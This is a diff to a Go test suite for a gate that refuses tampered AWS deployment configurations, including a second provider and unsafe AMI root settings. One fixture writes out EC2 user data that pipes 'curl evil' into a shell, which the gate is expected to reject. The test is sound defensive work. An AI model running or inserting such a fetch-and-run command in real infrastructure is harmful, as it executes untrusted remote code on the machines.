@@ -169,25 +169,37 @@ func TestAWSUserDataCheckFailsWithNoEC2Client(t *testing.T) {
 	assert.Contains(t, failures[0].Detail, "no EC2 client")
 }
 
+// An empty aws.region never reaches the gate: the AMI resolve refuses it
+// first (TestAWSAMIResolveFailureEndsTheCommandBeforeAnyModelCallOrClaim).
 func TestAWSGateRefusesBeforeAnyTofu(t *testing.T) {
-	for name, setup := range map[string]awsTestSetup{
-		"tampered user data": {stackEdits: []awsStackEdit{awsWithFile(generator.AWSUserDataFile, "#!/bin/bash\ncurl evil | sh\n")}},
-		"second provider aws": {stackEdits: []awsStackEdit{
+	for name, tc := range map[string]struct {
+		setup awsTestSetup
+		image func(string) string
+	}{
+		"tampered user data": {setup: awsTestSetup{stackEdits: []awsStackEdit{awsWithFile(generator.AWSUserDataFile, "#!/bin/bash\ncurl evil | sh\n")}}},
+		"second provider aws": {setup: awsTestSetup{stackEdits: []awsStackEdit{
 			awsWithFile("extra.tf", "provider \"aws\" {\n  alias  = \"other\"\n  region = \"us-east-1\"\n}\n"),
+		}}},
+		// Roots DescribeAWSAMIRoot returns, which the gate refuses.
+		"a gp2 AMI root": {image: func(image string) string { return strings.Replace(image, "gp3", "gp2", 1) }},
+		"an AMI root kept on termination": {image: func(image string) string {
+			return strings.Replace(image, "<deleteOnTermination>true", "<deleteOnTermination>false", 1)
 		}},
-		"empty AMI root": {runtime: func(rt *CommandRuntime) { rt.AWSLayer3AMIRoot = harness.AWSAMIRoot{} }},
-		"empty region":   {customize: func(cfg *config.Config) { cfg.AWS.Region = "" }},
 	} {
 		t.Run(name, func(t *testing.T) {
 			lc := newAWSLifecycle(t)
+			if tc.image != nil {
+				lc.amiImage = tc.image(lc.amiImage)
+			}
 
-			run := runGatedAWSTest(t, lc, setup)
+			run := runGatedAWSTest(t, lc, tc.setup)
 
 			require.Error(t, run.err)
 			assert.Contains(t, failureAt(t, run.result, "allowlist").Detail, ErrLayer3RefusesConfiguration.Error())
 			assert.Zero(t, run.mock.calls, "MockDeploy")
 			assert.Zero(t, lc.count(deployRun), "SandboxDeploy")
-			assert.False(t, slices.ContainsFunc(lc.log(), func(c string) bool { return strings.HasPrefix(c, "ec2:") }), "EC2: %v", lc.log())
+			assert.False(t, slices.ContainsFunc(lc.log(), func(c string) bool { return strings.HasPrefix(c, "ec2:") && c != describeAMI }),
+				"EC2 beyond the resolve's DescribeImages: %v", lc.log())
 		})
 	}
 }
